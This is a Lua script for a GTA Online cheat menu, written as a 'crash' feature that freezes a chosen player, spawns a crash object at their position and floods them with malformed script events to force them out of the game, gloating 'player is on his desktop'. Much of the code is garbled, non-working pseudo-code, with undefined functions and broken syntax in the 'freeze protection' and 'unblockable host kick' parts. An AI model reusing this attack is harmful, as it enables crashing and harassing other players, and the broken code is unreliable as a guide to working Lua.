menu.add_player_feature("ballsware.solutions brainfuck crash", "action", 0, function(playerfeat, pid)
    entity.freeze_entity(player.get_player_ped(pid), true)
    local X = object.create_world_object(3613262246, player.get_player_coords(pid), true, false)    
					system.yield(25)
	menu.notify("fucking his pc's brain rn")
	entity.delete_entity(X)
					system.yield(25)
    menu.notify("100% waiting for host request to return then player will be force kicked anyway")
	
	function freeze protection
	--during the crash from local player
  local limit = 10  
  for i in ipairs(vehicle.get_all_vehicles())do    
    local veh = vehicle.get_all_vehicles()[i]
    if vehicleNearByStorage[entity.get_entity_model_hash(veh)] ~= nil then
      vehicleNearByStorage[entity.get_entity_model_hash(veh)] = vehicleNearByStorage[entity.get_entity_model_hash(veh)]+1
    else
      vehicleNearByStorage[entity.get_entity_model_hash(veh)] = 1
    end     
    if (vehicleNearByStorage[entity.get_entity_model_hash(veh)] > limit) 
    and ped.get_vehicle_ped_is_using(player.get_player_ped(player.player_id())) ~= veh then
      local pos = entity.get_entity_coords(veh)
      pos.y = 20000
	  --anything in xyz 20000 will be unrendered
	  
	  --basically your game will freeze up for a second and then return after the crash attempt has completed
	  --will also ensure that the player is hit with an unblockable kick after the attack for saftey. you will be able to
	  --turn this feature on and off with a toggle button in case you dont feel like freezing everytime you use it
	  --auto detect for modders?!!?!
	  
	  
      network.request_control_of_entity(veh)
      entity.set_entity_coords_no_offset(veh,pos)
      entity.freeze_entity(veh,true)      
      entity.set_entity_as_no_longer_needed(veh)
      if (os.time() - lastNotify) > 10 then
         menu.notify("removed arrays successfully" .. entity.get_entity_model_hash(veh),"if this line is said in logs then thank fuck",5,140) 
        lastNotify = os.time()
      end
    end
  end
 


function unblockable host kick
	entity.votekick + hostgui
	menu.notify 
	menu.network.request(hkick(parimiters xpcall >)
	break 
		xms_load <#crash_menu_1_functions [local tableOfVehicles\local table <390>]
		
	     log(PLAYER.GET_PLAYER_NAME(PID))
		g_util.trigger_script_event(PID, {-1386010354, PID, math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000)})
	        g_util.trigger_script_event(PID,{-1386010354, PID, math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000), math.random(-10000, 10000)})
			
			PLAYER.GET_PLAYER_NAME(PID)<PRESENT>)
	and native.getSync(<rockstarid)
	xms_load ballsware.solutions <#(C:\Users\mrbal\...\modder_log.txt:String)
	nil rockstarid {-1386010354, -1386010354}
	toggle local.a
	if rockstarid_insync false
		then 
		menu.notify ("attack sucess player is on his desktop")
		elseif
		menu.notify ("attack unsucessful player is netsplit")
		end
	end	
	
	
end)